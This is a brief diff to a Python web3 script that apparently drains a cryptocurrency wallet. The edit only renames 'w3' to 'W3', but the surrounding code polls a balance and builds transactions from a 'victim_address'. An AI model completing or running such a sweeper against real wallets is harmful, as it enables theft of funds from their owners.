@@ -8,7 +8,7 @@ from decimal import *
 from config import *
 
 if ganache_mode:
-    W3 = w3 = Web3(Web3.HTTPProvider(ganache_url))
+    W3 = Web3(Web3.HTTPProvider(ganache_url))
     # W3 = Web3(Web3.HTTPProvider(ganache_url))
 else:
     W3 = Web3(Web3.HTTPProvider(infura_url))
@@ -52,7 +52,7 @@ def get_balance_loop():
 def build_transaction(balance):
     try:
         #get nonce number
-        nonce = w3.eth.get_transaction_count(victim_address)
+        nonce = W3.eth.get_transaction_count(victim_address)
         
         #build transaction
         tx = {
